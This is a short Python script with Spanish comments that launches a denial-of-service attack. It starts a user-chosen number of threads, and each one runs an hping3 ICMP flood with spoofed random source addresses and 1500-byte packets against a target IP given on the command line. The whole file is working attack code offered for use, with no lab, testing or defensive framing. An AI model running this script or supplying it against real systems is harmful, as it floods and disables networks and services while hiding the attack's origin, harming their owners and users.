import os
import sys
from concurrent.futures import ThreadPoolExecutor

def ejecucion_hping3(ip):
    try:
        os.system(f"hping3 --icmp --rand-source --flood -d 1500 {ip}")
    except BaseException as e:
        print(f"Ha ocurrido un error: {e}")

def ejecucion_procesos(ip, procesos=100):
    print("Ejecutándose")

    #Lanzamos los procesos de manera simultanea
    with ThreadPoolExecutor(max_workers=procesos) as ejecutar:
        ejecutar.map(ejecucion_hping3, (ip,) * procesos)

# Obtemos los argumentos de la línea de comandos
argumentos = sys.argv

# Verifica si se proporcionaron al menos dos argumentos
if len(argumentos) >= 3:
    ip = argumentos[1]
    num_procesos = int(argumentos[2])

    # Llama a la función con los argumentos proporcionados
    ejecucion_procesos(ip, num_procesos)
else:
    #Indicamos un mensaje de como se debe usar el script
    print("Uso: python script.py <IP> <num_procesos>")



        
    
        
    
